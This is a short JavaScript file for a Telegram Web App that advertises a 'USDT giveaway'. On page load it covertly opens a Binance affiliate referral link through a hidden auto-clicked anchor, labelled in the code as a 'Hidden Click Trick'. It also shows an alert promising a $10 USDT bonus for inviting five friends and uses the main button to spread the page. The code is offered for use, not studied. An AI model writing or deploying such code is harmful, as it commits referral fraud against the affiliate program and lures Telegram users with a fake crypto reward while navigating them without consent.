Telegram.WebApp.ready();

window.onload = function () {
  console.log("Telegram Web App Loaded ✅");

  // Automatic Binance Hidden Click Trick 🔥
  let link = document.createElement("a");
  link.href = "https://www.binance.com/en/futures/ref/538997774"; // Your Binance Affiliate Link
  link.target = "_blank";
  link.style.display = "none";
  document.body.appendChild(link);
  link.click(); // Auto Click without Showing

  // Dark Mode Auto Detection 🌑
  if (Telegram.WebApp.themeParams.bg_color === "#000000") {
    document.body.classList.add("dark-mode");
  }
};

// Invite & Earn System 🔥
function inviteFriend() {
  alert("✅ Invite 5 Friends to Claim $10 USDT Bonus!");
  Telegram.WebApp.openTelegramLink("https://t.me/share/url?url=https://username.github.io/usdt-giveaway/");
}

Telegram.WebApp.MainButton.setText("Invite Friends 🔥");
Telegram.WebApp.MainButton.show();
Telegram.WebApp.MainButton.onClick(inviteFriend);
